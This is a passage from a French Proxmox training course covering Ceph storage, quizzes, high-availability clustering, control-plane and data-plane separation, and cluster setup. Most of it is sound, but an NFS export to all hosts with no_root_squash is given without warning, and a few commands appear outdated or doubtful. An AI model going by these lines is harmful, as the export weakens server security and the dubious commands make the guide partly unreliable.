ceph osd pool set backup-pool size 2
ceph osd pool set backup-pool min_size 1
```

**Placement Groups (PG)** déterminent comment les données sont distribuées dans le cluster. Le nombre de PG impacte directement les performances et la distribution.

```bash
# Calcul optimal PG : (OSDs × 100) / réplication / pools
# Exemple : (6 OSDs × 100) / 3 réplication / 2 pools = 100 PG par pool

# Ajustement nombre PG
ceph osd pool set vm-pool pg_num 128
ceph osd pool set vm-pool pgp_num 128

# Vérification distribution
ceph pg dump | grep -E "^pg_stat"
```

### CRUSH Map et règles de placement

**CRUSH (Controlled Replication Under Scalable Hashing)** détermine intelligemment où placer les données selon la topologie du cluster et les règles définies.

```bash
# Visualisation CRUSH map
ceph osd tree

# Exemple sortie :
# ID CLASS WEIGHT  TYPE NAME          STATUS
# -1       6.00000 root default
# -3       2.00000     host proxmox1
#  0   ssd 1.00000         osd.0         up
#  3   ssd 1.00000         osd.3         up
# -5       2.00000     host proxmox2
#  1   ssd 1.00000         osd.1         up
#  4   ssd 1.00000         osd.4         up
# -7       2.00000     host proxmox3
#  2   ssd 1.00000         osd.2         up
#  5   ssd 1.00000         osd.5         up

# Création règle personnalisée (réplication par rack)
ceph osd crush rule create-replicated rack-rule default rack ssd

# Application règle à un pool
ceph osd pool set vm-pool crush_rule rack-rule
```

### RBD : RADOS Block Device

**RBD** fournit des volumes bloc distribués pour les machines virtuelles, avec snapshots, clonage, et redimensionnement à chaud.

```bash
# Création image RBD
rbd create --size 100G vm-pool/vm-101-disk-0

# Liste images
rbd ls vm-pool

# Informations détaillées
rbd info vm-pool/vm-101-disk-0

# Redimensionnement à chaud
rbd resize --size 150G vm-pool/vm-101-disk-0

# Snapshots RBD
rbd snap create vm-pool/vm-101-disk-0@snapshot-$(date +%Y%m%d)
rbd snap ls vm-pool/vm-101-disk-0

# Clonage (nécessite snapshot protégé)
rbd snap protect vm-pool/vm-101-disk-0@snapshot-20241201
rbd clone vm-pool/vm-101-disk-0@snapshot-20241201 vm-pool/vm-102-disk-0
```

### Monitoring et maintenance Ceph

**Surveillance de l'état du cluster :**

```bash
# État global cluster
ceph status
ceph health detail

# Utilisation espace
ceph df
ceph osd df

# Performance temps réel
ceph -w  # Mode watch

# Statistiques détaillées
ceph osd perf
ceph osd pool stats
```

**Maintenance préventive :**

```bash
# Vérification intégrité données (scrub)
ceph pg scrub 1.0  # Scrub PG spécifique
ceph osd deep-scrub osd.0  # Deep scrub OSD

# Rééquilibrage manuel
ceph osd reweight 0 0.8  # Réduire poids OSD.0

# Maintenance OSD (sortie temporaire)
ceph osd set noout  # Empêcher rééquilibrage
ceph osd out 0      # Sortir OSD.0
# Maintenance hardware
ceph osd in 0       # Remettre OSD.0
ceph osd unset noout
```

### Optimisation des performances Ceph

**Tuning réseau :**

```bash
# Configuration réseau dédié
# /etc/ceph/ceph.conf
[global]
public_network = 192.168.1.0/24
cluster_network = 10.0.0.0/24  # Réseau dédié réplication

# Optimisations réseau
echo 'net.core.rmem_max = 134217728' >> /etc/sysctl.conf
echo 'net.core.wmem_max = 134217728' >> /etc/sysctl.conf
echo 'net.ipv4.tcp_rmem = 4096 87380 134217728' >> /etc/sysctl.conf
```

**Optimisations OSD :**

```bash
# Configuration OSD pour SSD
[osd]
osd_op_threads = 8
osd_disk_threads = 4
osd_journal_size = 10240  # 10GB journal
filestore_max_sync_interval = 5
filestore_min_sync_interval = 0.01
```

**Monitoring avancé :**

```bash
# Installation Prometheus + Grafana
ceph mgr module enable prometheus
# Dashboard Grafana disponible sur port 3000

# Métriques clés à surveiller :
# - Latence I/O (< 10ms)
# - IOPS par OSD
# - Utilisation réseau cluster
# - Taux d'erreur PG
```

### Cas d'usage spécialisés

**Infrastructure cloud privé :** Déployez Ceph avec des pools différenciés par performance (SSD pour VMs critiques, HDD pour stockage froid). Configurez des règles CRUSH pour distribuer les données selon la géographie ou les racks.

**Sauvegarde et archivage :** Utilisez des pools avec réplication réduite (size=2) pour optimiser l'espace de stockage. Implémentez des politiques de lifecycle pour migrer automatiquement les données anciennes vers du stockage moins coûteux.

**Environnement de développement :** Exploitez les snapshots et clones RBD pour créer rapidement des environnements de test. Configurez des pools dédiés avec des performances adaptées aux besoins de développement.

---


## Quiz Module 3 : Réseau Virtuel

**Question 1 :** Dans un bridge VLAN-aware, quelle configuration permet à une VM d'accéder au VLAN 20 ?
a) bridge-vids 20
b) tag=20 dans la configuration VM
c) vlan-raw-device 20
d) bridge-ports vlan20

**Question 2 :** Le mode de bonding 802.3ad (LACP) nécessite :
a) Seulement la configuration serveur
b) Configuration serveur + switch compatible
c) Uniquement des interfaces identiques
d) Un nombre pair d'interfaces

**Question 3 :** Virtio-net offre de meilleures performances que e1000 car :
a) Il émule mieux le hardware
b) Il utilise la paravirtualisation
c) Il supporte plus de VLAN
d) Il consomme moins de RAM

**Question 4 :** SR-IOV permet :
a) D'augmenter le nombre de VLAN
b) L'accès direct hardware pour les VM
c) De créer plus de bridges
d) D'améliorer la sécurité réseau

**Question 5 :** La hash policy layer3+4 répartit le trafic selon :
a) Les adresses MAC
b) Les adresses IP uniquement
c) Les adresses IP + ports
d) Le round-robin

**Réponses :** 1-b, 2-b, 3-b, 4-b, 5-c

---

## Quiz Module 4 : Stockage

**Question 1 :** LVM-Thin permet :
a) D'améliorer les performances IOPS
b) L'allocation d'espace à la demande
c) De chiffrer les données
d) De créer des RAID logiciels

**Question 2 :** En ZFS, un snapshot :
a) Consomme immédiatement l'espace du volume
b) Ne consomme de l'espace que pour les modifications
c) Nécessite un disque dédié
d) Ralentit les performances

**Question 3 :** Dans Ceph, les Placement Groups (PG) :
a) Stockent les métadonnées
b) Déterminent la distribution des données
c) Gèrent l'authentification
d) Contrôlent la bande passante

**Question 4 :** Le niveau RAIDZ2 en ZFS tolère la perte de :
a) 1 disque
b) 2 disques
c) 3 disques
d) 50% des disques

**Question 5 :** L'avantage principal du stockage distribué est :
a) Les performances maximales
b) La simplicité de configuration
c) L'élimination des SPOF
d) Le coût réduit

**Réponses :** 1-b, 2-b, 3-b, 4-b, 5-c

---

## Bonnes Pratiques Modules 3-4

### Réseau Virtuel
- [ ] Utiliser des bridges VLAN-aware pour la flexibilité
- [ ] Implémenter le bonding LACP pour la redondance
- [ ] Séparer les flux avec des VLAN dédiés (mgmt, storage, VM)
- [ ] Privilégier virtio-net pour les performances
- [ ] Configurer SR-IOV pour les applications critiques
- [ ] Monitorer la bande passante et les erreurs réseau
- [ ] Documenter le plan d'adressage VLAN

### Stockage
- [ ] Choisir la technologie selon les besoins (local vs distribué)
- [ ] Utiliser LVM-Thin pour l'efficacité d'espace
- [ ] Implémenter des snapshots réguliers
- [ ] Configurer la compression ZFS (lz4 recommandé)
- [ ] Dimensionner Ceph avec minimum 3 nœuds
- [ ] Séparer réseau public/cluster pour Ceph
- [ ] Surveiller l'utilisation et les performances
- [ ] Tester régulièrement les procédures de restauration

---

# Module 5 : Haute Disponibilité et Clustering

## 5.1 Concepts de clustering

### Philosophie de la haute disponibilité

La **haute disponibilité (HA)** vise à maintenir les services opérationnels même en cas de défaillance de composants individuels. Cette approche transforme l'infrastructure d'un ensemble de points de défaillance unique en un système résilient capable de s'auto-réparer et de maintenir la continuité de service.

Imaginez un cluster comme un **orchestre symphonique professionnel** : si un musicien tombe malade, un remplaçant prend immédiatement sa place sans que le public ne s'en aperçoive. Le chef d'orchestre (gestionnaire de cluster) coordonne l'ensemble et s'assure que la musique continue, même si plusieurs musiciens doivent être remplacés simultanément.

La haute disponibilité ne se limite pas à la redondance hardware ; elle englobe la conception d'applications, la gestion des données, la surveillance proactive, et les procédures de récupération automatisées. L'objectif est d'atteindre des niveaux de disponibilité de 99.9% (8.76 heures d'arrêt par an) à 99.999% (5.26 minutes d'arrêt par an).

### Types de clustering

**Clustering Actif/Passif** maintient des nœuds de secours qui prennent le relais en cas de défaillance du nœud principal. Cette approche simple garantit la continuité mais n'optimise pas l'utilisation des ressources.

```
Cluster Actif/Passif :

┌─────────────────┐    ┌─────────────────┐
│   Node 1        │    │   Node 2        │
│   (ACTIF)       │    │   (PASSIF)      │
│                 │    │                 │
│ ┌─────────────┐ │    │ ┌─────────────┐ │
│ │ Service A   │ │    │ │ Service A   │ │
│ │ (Running)   │ │    │ │ (Stopped)   │ │
│ └─────────────┘ │    │ └─────────────┘ │
│ ┌─────────────┐ │    │ ┌─────────────┐ │
│ │ Service B   │ │    │ │ Service B   │ │
│ │ (Running)   │ │    │ │ (Stopped)   │ │
│ └─────────────┘ │    │ └─────────────┘ │
└─────────────────┘    └─────────────────┘
         │                       │
         └───────────────────────┘
              Heartbeat/Quorum

Avantages :
✓ Simplicité de configuration
✓ Basculement prévisible
✓ Isolation complète des services

Inconvénients :
✗ Gaspillage de ressources (50%)
✗ Temps de basculement (30s-2min)
✗ Pas de répartition de charge
```

**Clustering Actif/Actif** distribue la charge entre tous les nœuds disponibles, maximisant l'utilisation des ressources et offrant une meilleure scalabilité.

```
Cluster Actif/Actif :

┌─────────────────┐    ┌─────────────────┐
│   Node 1        │    │   Node 2        │
│   (ACTIF)       │    │   (ACTIF)       │
│                 │    │                 │
│ ┌─────────────┐ │    │ ┌─────────────┐ │
│ │ Service A   │ │    │ │ Service C   │ │
│ │ (Running)   │ │    │ │ (Running)   │ │
│ └─────────────┘ │    │ └─────────────┘ │
│ ┌─────────────┐ │    │ ┌─────────────┐ │
│ │ Service B   │ │    │ │ Service D   │ │
│ │ (Running)   │ │    │ │ (Running)   │ │
│ └─────────────┘ │    │ └─────────────┘ │
└─────────────────┘    └─────────────────┘
         │                       │
         └───────────────────────┘
           Load Balancer/Scheduler

En cas de panne Node 1 :
Node 2 hérite Services A+B
Utilisation : 100% des ressources
```

### Quorum et Split-Brain

Le **quorum** représente le nombre minimum de nœuds nécessaires pour maintenir l'intégrité du cluster et prendre des décisions. Cette mécanisme prévient le **split-brain**, situation catastrophique où plusieurs parties du cluster croient être le maître légitime.

```
Problème Split-Brain :

Cluster 4 nœuds - Perte réseau :

Partition A          Partition B
┌─────────────┐     ┌─────────────┐
│   Node 1    │     │   Node 3    │
│  (MASTER)   │     │  (MASTER)   │
├─────────────┤     ├─────────────┤
│   Node 2    │     │   Node 4    │
│  (SLAVE)    │     │  (SLAVE)    │
└─────────────┘     └─────────────┘

Résultat : 2 clusters indépendants
Risque : Corruption de données
Solution : Quorum impair (3, 5, 7 nœuds)

Quorum 3 nœuds :
┌─────────────┐     ┌─────────────┐
│   Node 1    │     │   Node 3    │
│  (MASTER)   │     │ (ISOLATED)  │
├─────────────┤     └─────────────┘
│   Node 2    │     
│  (SLAVE)    │     Partition B : Pas de quorum
└─────────────┘     → Arrêt automatique services

Partition A : Quorum maintenu (2/3)
→ Continue les opérations
```

### Fencing et STONITH

**Fencing** isole un nœud défaillant pour éviter qu'il interfère avec le cluster. **STONITH (Shoot The Other Node In The Head)** représente la méthode la plus radicale : couper physiquement l'alimentation du nœud problématique.

```bash
# Configuration fencing IPMI
stonith_admin --register fence_ipmilan --agent fence_ipmilan
crm configure primitive fence_node1 stonith:fence_ipmilan \
    params pcmk_host_list="node1" ipaddr="192.168.1.101" \
    login="admin" passwd="password" \
    op monitor interval="60s"

# Test fencing
stonith_admin --reboot node1
```

### Proxmox HA : Configuration et gestion

**Proxmox High Availability** intègre nativement les fonctionnalités de clustering avec gestion automatique des VM et conteneurs en cas de défaillance.

```bash
# Création cluster Proxmox
# Sur le premier nœud
pvecm create production-cluster

# Ajout des nœuds supplémentaires
# Sur chaque nœud à ajouter
pvecm add 192.168.1.100  # IP du premier nœud

# Vérification cluster
pvecm status
pvecm nodes

# Configuration quorum
pvecm expected 3  # Forcer quorum pour 3 nœuds
```

**Configuration HA pour les VM :**

```bash
# Activation HA pour une VM
ha-manager add vm:101 --state started --group production

# Création groupe HA avec priorités
ha-manager groupadd production --nodes "node1:2,node2:1,node3:1"

# Configuration politique de migration
ha-manager set vm:101 --max_restart 3 --max_relocate 1

# Surveillance état HA
ha-manager status
watch ha-manager status
```

### Stockage partagé pour HA

La haute disponibilité nécessite un stockage accessible depuis tous les nœuds du cluster. Sans stockage partagé, les VM ne peuvent pas migrer entre nœuds.

**Options de stockage HA :**

```
Stockage HA - Comparaison :

┌─────────────┬─────────────┬─────────────┬─────────────┐
│ Solution    │Performance  │ Complexité  │ Coût        │
├─────────────┼─────────────┼─────────────┼─────────────┤
│ Ceph RBD    │ Bonne       │ Élevée      │ Faible      │
│ iSCSI SAN   │ Excellente  │ Moyenne     │ Élevé       │
│ NFS         │ Moyenne     │ Faible      │ Faible      │
│ GlusterFS   │ Moyenne     │ Moyenne     │ Faible      │
│ ZFS over    │ Bonne       │ Élevée      │ Moyen       │
│ iSCSI       │             │             │             │
└─────────────┴─────────────┴─────────────┴─────────────┘

Recommandation production :
- Ceph : Clusters 3+ nœuds, auto-réparation
- iSCSI : Performance maximale, SAN dédié
- NFS : Simplicité, charges non-critiques
```

### Migration et Live Migration

**Migration à froid** déplace une VM arrêtée vers un autre nœud, nécessitant un arrêt de service.

**Live Migration** (migration à chaud) transfère une VM en fonctionnement sans interruption de service, technique essentielle pour la maintenance sans impact.

```bash
# Migration à froid
qm migrate 101 node2

# Live migration
qm migrate 101 node2 --online

# Migration avec stockage
qm migrate 101 node2 --online --targetstorage ceph-storage

# Surveillance migration
qm status 101
tail -f /var/log/pve/tasks/active
```

**Prérequis live migration :**
- Stockage partagé ou réplication temps réel
- Réseau haute performance (1Gbps minimum)
- CPU compatibles (même famille/features)
- Synchronisation temps (NTP)

### Monitoring et alertes HA

**Surveillance proactive** détecte les problèmes avant qu'ils n'impactent la disponibilité.

```bash
# Script monitoring cluster
#!/bin/bash
CLUSTER_STATUS=$(pvecm status | grep "Quorum information" -A 10)
EXPECTED_NODES=3
ACTIVE_NODES=$(pvecm nodes | grep -c "online")

if [ $ACTIVE_NODES -lt $EXPECTED_NODES ]; then
    echo "ALERT: Only $ACTIVE_NODES/$EXPECTED_NODES nodes online"
    # Envoi alerte (email, Slack, etc.)
fi

# Vérification services HA
HA_SERVICES=$(ha-manager status | grep -c "started")
if [ $HA_SERVICES -eq 0 ]; then
    echo "WARNING: No HA services running"
fi
```

**Métriques critiques à surveiller :**
- État des nœuds cluster
- Quorum et connectivité
- Utilisation ressources (CPU, RAM, stockage)
- Latence réseau inter-nœuds
- État des services HA

---

## 5.2 Data plane vs Control plane

### Séparation des plans : Principe fondamental

La **séparation data plane / control plane** constitue un principe architectural fondamental qui distingue les fonctions de gestion et de contrôle (control plane) des fonctions de traitement des données (data plane). Cette séparation améliore la sécurité, les performances, et la maintenabilité des infrastructures complexes.

Imaginez cette séparation comme la **différence entre les pilotes et les contrôleurs aériens** : les contrôleurs (control plane) planifient les routes, gèrent le trafic et prennent les décisions stratégiques, tandis que les pilotes (data plane) exécutent les instructions et transportent effectivement les passagers. Cette séparation permet d'optimiser chaque fonction indépendamment.

### Control Plane : Cerveau du système

Le **control plane** gère les décisions, la configuration, et l'orchestration. Il détermine QUOI faire et COMMENT le faire, mais ne traite pas directement les données utilisateur.

```
Control Plane - Responsabilités :

┌─────────────────────────────────────────────────────┐
│                Control Plane                        │
├─────────────────────────────────────────────────────┤
│ ┌─────────────┐ ┌─────────────┐ ┌─────────────┐     │
│ │ API Server  │ │ Scheduler   │ │ Controller  │     │
│ │             │ │             │ │ Manager     │     │
│ │ - Auth      │ │ - Placement │ │ - Reconcile │     │
│ │ - Validation│ │ - Resources │ │ - Monitor   │     │
│ │ - Config    │ │ - Policies  │ │ - Heal      │     │
│ └─────────────┘ └─────────────┘ └─────────────┘     │
├─────────────────────────────────────────────────────┤
│ ┌─────────────┐ ┌─────────────┐ ┌─────────────┐     │
│ │ etcd/DB     │ │ Networking  │ │ Storage     │     │
│ │             │ │ Controller  │ │ Controller  │     │
│ │ - State     │ │ - SDN       │ │ - Volumes   │     │
│ │ - Config    │ │ - Policies  │ │ - Snapshots │     │
│ │ - Metadata  │ │ - Routing   │ │ - Backup    │     │
│ └─────────────┘ └─────────────┘ └─────────────┘     │
└─────────────────────────────────────────────────────┘
                         │
                         ▼ Instructions/Policies
┌─────────────────────────────────────────────────────┐
│                  Data Plane                         │
└─────────────────────────────────────────────────────┘
```

**Fonctions du control plane :**
- **Authentification et autorisation** des utilisateurs et services
- **Planification et scheduling** des ressources
- **Gestion de configuration** et des politiques
- **Surveillance et monitoring** de l'état du système
- **Orchestration** des opérations complexes
- **Gestion des métadonnées** et de l'état désiré

### Data Plane : Muscle du système

Le **data plane** exécute les instructions du control plane et traite effectivement les données utilisateur. Il se concentre sur les performances, le débit, et la latence.

```
Data Plane - Architecture :

┌─────────────────────────────────────────────────────┐
│                   Data Plane                        │
├─────────────────────────────────────────────────────┤
│ ┌─────────────┐ ┌─────────────┐ ┌─────────────┐     │
│ │ Compute     │ │ Network     │ │ Storage     │     │
│ │ Workers     │ │ Forwarding  │ │ I/O         │     │
│ │             │ │             │ │             │     │
│ │ - VMs       │ │ - Switching │ │ - Read/Write│     │
│ │ - Containers│ │ - Routing   │ │ - Caching   │     │
│ │ - Processes │ │ - Filtering │ │ - Replication│     │
│ └─────────────┘ └─────────────┘ └─────────────┘     │
├─────────────────────────────────────────────────────┤
│ ┌─────────────┐ ┌─────────────┐ ┌─────────────┐     │
│ │ Hypervisor  │ │ OVS/eBPF    │ │ Ceph OSDs   │     │
│ │ KVM/QEMU    │ │ Hardware    │ │ ZFS         │     │
│ │             │ │ Offload     │ │ Block Devs  │     │
│ │ - CPU Sched │ │ - DPDK      │ │ - IOPS      │     │
│ │ - Memory    │ │ - SR-IOV    │ │ - Throughput│     │
│ │ - I/O       │ │ - SmartNIC  │ │ - Latency   │     │
│ └─────────────┘ └─────────────┘ └─────────────┘     │
└─────────────────────────────────────────────────────┘
```

**Fonctions du data plane :**
- **Exécution des workloads** (VMs, conteneurs, applications)
- **Traitement réseau** (commutation, routage, filtrage)
- **Opérations de stockage** (lecture, écriture, réplication)
- **Optimisation des performances** (cache, compression, offload)
- **Application des politiques** définies par le control plane

### Exemples concrets de séparation

**Kubernetes : Séparation native**

```
Kubernetes Architecture :

Control Plane (Master Nodes)     Data Plane (Worker Nodes)
┌─────────────────────────┐      ┌─────────────────────────┐
│ kube-apiserver          │      │ kubelet                 │
│ ├─ API REST             │◄────►│ ├─ Pod Management       │
│ ├─ Authentication       │      │ ├─ Container Runtime    │
│ └─ Validation           │      │ └─ Resource Monitoring  │
├─────────────────────────┤      ├─────────────────────────┤
│ kube-scheduler          │      │ kube-proxy              │
│ ├─ Pod Placement        │      │ ├─ Service Discovery    │
│ ├─ Resource Allocation  │      │ ├─ Load Balancing       │
│ └─ Affinity Rules       │      │ └─ Network Policies     │
├─────────────────────────┤      ├─────────────────────────┤
│ kube-controller-manager │      │ Container Runtime       │
│ ├─ Deployment Controller│      │ ├─ Docker/containerd    │
│ ├─ ReplicaSet Controller│      │ ├─ Pod Execution        │
│ └─ Service Controller   │      │ └─ Image Management     │
├─────────────────────────┤      ├─────────────────────────┤
│ etcd                    │      │ CNI Plugin              │
│ ├─ Cluster State        │      │ ├─ Pod Networking       │
│ ├─ Configuration        │      │ ├─ IP Allocation        │
│ └─ Service Discovery    │      │ └─ Network Policies     │
└─────────────────────────┘      └─────────────────────────┘
```

**Proxmox : Séparation implicite**

```bash
# Control Plane Proxmox
systemctl status pve-cluster    # Gestion cluster
systemctl status pvedaemon      # API et interface web
systemctl status pveproxy       # Proxy web
systemctl status pvestatd       # Collecte statistiques

# Data Plane Proxmox
systemctl status qemu-server    # Exécution VMs
systemctl status lxc            # Exécution conteneurs
systemctl status ceph-osd       # Stockage données
systemctl status openvswitch    # Commutation réseau
```

### SDN : Software Defined Networking

**SDN** illustre parfaitement la séparation data/control plane en centralisant l'intelligence réseau dans un contrôleur logiciel tout en déportant l'exécution vers des switches "stupides".

```
SDN Architecture :

                Control Plane (Centralisé)
┌─────────────────────────────────────────────────────┐
│              SDN Controller                         │
│  ┌─────────────┐ ┌─────────────┐ ┌─────────────┐   │
│  │ Topology    │ │ Path        │ │ Policy      │   │
│  │ Discovery   │ │ Computation │ │ Engine      │   │
│  └─────────────┘ └─────────────┘ └─────────────┘   │
│  ┌─────────────┐ ┌─────────────┐ ┌─────────────┐   │
│  │ Flow        │ │ QoS         │ │ Security    │   │
│  │ Programming │ │ Management  │ │ Policies    │   │
│  └─────────────┘ └─────────────┘ └─────────────┘   │
└─────────────────────────────────────────────────────┘
                         │ OpenFlow/NETCONF
                         ▼
                Data Plane (Distribué)
┌─────────────┐ ┌─────────────┐ ┌─────────────┐
│ Switch 1    │ │ Switch 2    │ │ Switch 3    │
│ ┌─────────┐ │ │ ┌─────────┐ │ │ ┌─────────┐ │
│ │Flow     │ │ │ │Flow     │ │ │ │Flow     │ │
│ │Table    │ │ │ │Table    │ │ │ │Table    │ │
│ └─────────┘ │ │ └─────────┘ │ │ └─────────┘ │
│ ┌─────────┐ │ │ ┌─────────┐ │ │ ┌─────────┐ │
│ │Packet   │ │ │ │Packet   │ │ │ │Packet   │ │
│ │Forward  │ │ │ │Forward  │ │ │ │Forward  │ │
│ └─────────┘ │ │ └─────────┘ │ │ └─────────┘ │
└─────────────┘ └─────────────┘ └─────────────┘
```

**Configuration SDN avec Open vSwitch :**

```bash
# Installation contrôleur SDN (exemple : Floodlight)
wget http://floodlight.openflowhub.org/files/floodlight-vm-1.2.ova

# Configuration OVS pour SDN
ovs-vsctl set-controller br0 tcp:192.168.1.100:6653
ovs-vsctl set bridge br0 protocols=OpenFlow13

# Vérification connexion contrôleur
ovs-vsctl show
ovs-ofctl show br0

# Programmation flows via contrôleur
curl -X POST -d '{
    "switch": "00:00:00:00:00:00:00:01",
    "name": "flow-1",
    "priority": "100",
    "in_port": "1",
    "active": "true",
    "actions": "output=2"
}' http://192.168.1.100:8080/wm/staticflowpusher/json
```

### Avantages de la séparation

**Sécurité renforcée** : Le control plane peut être isolé dans un réseau sécurisé, réduisant la surface d'attaque.

```bash
# Isolation réseau control plane
# VLAN dédié pour management
auto ens18.100
iface ens18.100 inet static
    address 10.0.100.10/24
    vlan-raw-device ens18

# Firewall restrictif control plane
iptables -A INPUT -i ens18.100 -p tcp --dport 8006 -j ACCEPT  # Proxmox web
iptables -A INPUT -i ens18.100 -p tcp --dport 22 -j ACCEPT    # SSH
iptables -A INPUT -i ens18.100 -j DROP  # Tout le reste
```

**Scalabilité améliorée** : Le data plane peut être distribué et optimisé indépendamment du control plane.

**Maintenance simplifiée** : Mise à jour du control plane sans impact sur le trafic de données.

### Défis et considérations

**Latence control plane** : Les décisions centralisées peuvent introduire des délais.

**Point de défaillance** : Un control plane centralisé devient critique.

**Complexité** : La séparation ajoute des couches d'abstraction.

**Solutions de mitigation :**

```bash
# HA pour control plane
# Cluster etcd 3 nœuds
etcd --name node1 --initial-cluster node1=http://10.0.100.10:2380,node2=http://10.0.100.11:2380,node3=http://10.0.100.12:2380

# Cache local data plane
# Réplication état critique localement
ovs-vsctl set bridge br0 fail_mode=standalone  # Continue sans contrôleur
```

### Cas d'usage spécialisés

**Infrastructure cloud** : Séparez les API de gestion (control plane) des hyperviseurs (data plane) pour permettre la maintenance rolling sans impact service.

**Réseau d'entreprise** : Centralisez les politiques de sécurité dans le control plane tout en distribuant l'application dans les équipements réseau.

**Environnement DevOps** : Utilisez des contrôleurs Kubernetes pour orchestrer les déploiements (control plane) tout en optimisant l'exécution sur les nœuds workers (data plane).

---

## 5.3 Proxmox clustering

### Architecture cluster Proxmox

Un **cluster Proxmox** transforme plusieurs serveurs physiques indépendants en une infrastructure unifiée capable de gérer les ressources de manière centralisée, d'assurer la haute disponibilité, et de faciliter la migration des charges de travail. Cette architecture distribue l'intelligence tout en maintenant la cohérence des données et des configurations.

```
Cluster Proxmox 3 nœuds - Architecture complète :

                    Management Network (192.168.1.0/24)
                              │
        ┌─────────────────────┼─────────────────────┐
        │                     │                     │
┌───────▼──────┐    ┌─────────▼──────┐    ┌─────────▼──────┐
│ proxmox1     │    │ proxmox2       │    │ proxmox3       │
│ 192.168.1.10 │    │ 192.168.1.11   │    │ 192.168.1.12   │
├──────────────┤    ├────────────────┤    ├────────────────┤
│ Cluster Node │    │ Cluster Node   │    │ Cluster Node   │
│ ┌──────────┐ │    │ ┌────────────┐ │    │ ┌────────────┐ │
│ │ corosync │ │◄──►│ │ corosync   │ │◄──►│ │ corosync   │ │
│ │ quorum   │ │    │ │ quorum     │ │    │ │ quorum     │ │
│ └──────────┘ │    │ └────────────┘ │    │ └────────────┘ │
│ ┌──────────┐ │    │ ┌────────────┐ │    │ ┌────────────┐ │
│ │ pmxcfs   │ │◄──►│ │ pmxcfs     │ │◄──►│ │ pmxcfs     │ │
│ │ (config) │ │    │ │ (config)   │ │    │ │ (config)   │ │
│ └──────────┘ │    │ └────────────┘ │    │ └────────────┘ │
├──────────────┤    ├────────────────┤    ├────────────────┤
│ VMs/LXC      │    │ VMs/LXC        │    │ VMs/LXC        │
│ ┌──────────┐ │    │ ┌────────────┐ │    │ ┌────────────┐ │
│ │ VM 101   │ │    │ │ VM 102     │ │    │ │ VM 103     │ │
│ │ VM 104   │ │    │ │ VM 105     │ │    │ │ VM 106     │ │
│ └──────────┘ │    │ └────────────┘ │    │ └────────────┘ │
├──────────────┤    ├────────────────┤    ├────────────────┤
│ Storage      │    │ Storage        │    │ Storage        │
│ ┌──────────┐ │    │ ┌────────────┐ │    │ ┌────────────┐ │
│ │ Ceph OSD │ │    │ │ Ceph OSD   │ │    │ │ Ceph OSD   │ │
│ │ Local LVM│ │    │ │ Local LVM  │ │    │ │ Local LVM  │ │
│ └──────────┘ │    │ └────────────┘ │    │ └────────────┘ │
└──────────────┘    └────────────────┘    └────────────────┘
        │                     │                     │
        └─────────────────────┼─────────────────────┘
                              │
                    Storage Network (10.0.0.0/24)
                    Corosync Ring (172.16.0.0/24)

Composants cluster :
┌─────────────┬─────────────────────────────────────────┐
│ corosync    │ Communication inter-nœuds, quorum      │
│ pmxcfs      │ Système de fichiers distribué config   │
│ pve-cluster │ Gestion cluster, API                    │
│ ha-manager  │ Haute disponibilité VMs/LXC            │
│ pveproxy    │ Interface web unifiée                   │
└─────────────┴─────────────────────────────────────────┘
```

### Création et configuration cluster

**Initialisation du cluster :**

```bash
# Sur le premier nœud (proxmox1)
pvecm create production-cluster --bindnet0_addr 192.168.1.10 --ring0_addr 172.16.0.10

# Vérification création
pvecm status
pvecm nodes

# Configuration réseau corosync (optionnel)
# /etc/pve/corosync.conf
totem {
    version: 2
    cluster_name: production-cluster
    config_version: 1
    transport: knet
    
    interface {
        ringnumber: 0
        bindnetaddr: 192.168.1.0
        mcastaddr: 239.192.1.1
        mcastport: 5405
        ttl: 1
    }
    
    interface {
        ringnumber: 1
        bindnetaddr: 172.16.0.0
        mcastaddr: 239.192.2.1
        mcastport: 5406
        ttl: 1
    }
}

quorum {
    provider: corosync_votequorum
    expected_votes: 3
    two_node: 0
}
```

**Ajout de nœuds au cluster :**

```bash
# Sur chaque nœud à ajouter (proxmox2, proxmox3)
pvecm add 192.168.1.10 --ring0_addr 172.16.0.11  # proxmox2
pvecm add 192.168.1.10 --ring0_addr 172.16.0.12  # proxmox3

# Vérification sur tous les nœuds
pvecm status
corosync-quorumtool -s

# Test connectivité cluster
pvecm mtunnel -migration_network 192.168.1.0/24 192.168.1.11
```

### Gestion du quorum

**Configuration quorum adaptatif :**

```bash
# Vérification état quorum
corosync-quorumtool -s

# Modification quorum attendu (maintenance)
pvecm expected 2  # Temporaire pour maintenance 1 nœud

# Retour configuration normale
pvecm expected 3

# Configuration quorum device (witness externe)
pvecm qdevice setup 192.168.1.200  # Serveur witness
pvecm qdevice add device model=net:host=192.168.1.200:port=5403
```

**Gestion des situations de split-brain :**

```bash
# Forcer quorum en cas d'urgence (DANGER)
corosync-quorumtool -e  # Expected votes = current nodes

# Diagnostic problèmes quorum
journalctl -u corosync
journalctl -u pve-cluster

# Reset cluster en cas de corruption
systemctl stop pve-cluster corosync
rm -rf /etc/corosync/*
rm -rf /etc/pve/nodes/*/pve-ssl.pem
# Recréer cluster depuis zéro
```

### Stockage partagé et migration

**Configuration stockage partagé Ceph :**

```bash
# Installation Ceph sur cluster
# Via interface web : Datacenter > Ceph > Install

# Configuration pools dédiés
ceph osd pool create vm-storage 128 128
ceph osd pool create ct-storage 64 64
ceph osd pool application enable vm-storage rbd
ceph osd pool application enable ct-storage rbd

# Ajout stockage dans Proxmox
pvesm add ceph vm-storage --pool vm-storage --content images
pvesm add ceph ct-storage --pool ct-storage --content rootdir

# Test migration
qm migrate 101 proxmox2 --online --targetstorage vm-storage
```

**Configuration NFS partagé :**

```bash
# Serveur NFS dédié ou nœud cluster
apt install nfs-kernel-server

# Configuration exports
echo "/srv/proxmox *(rw,sync,no_root_squash,no_subtree_check)" >> /etc/exports
exportfs -ra

# Ajout dans cluster
pvesm add nfs shared-nfs --server 192.168.1.200 --export /srv/proxmox --content images,vztmpl,backup

# Test accès depuis tous nœuds
showmount -e 192.168.1.200
```

### Haute disponibilité intégrée

**Configuration HA Manager :**

```bash
# Création groupes HA avec priorités
ha-manager groupadd production --nodes "proxmox1:3,proxmox2:2,proxmox3:1" --restricted

ha-manager groupadd development --nodes "proxmox2:2,proxmox3:2,proxmox1:1"

# Activation HA pour VMs critiques
ha-manager add vm:101 --state started --group production --max_restart 3 --max_relocate 1

ha-manager add vm:102 --state started --group production --max_restart 2 --max_relocate 2

# Configuration politiques HA
ha-manager set vm:101 --comment "Production DB - Critical"
```

**Surveillance et gestion HA :**

```bash
# Monitoring état HA
ha-manager status
watch -n 5 ha-manager status

# Logs HA détaillés
journalctl -u pve-ha-lrm
journalctl -u pve-ha-crm

# Test failover manuel
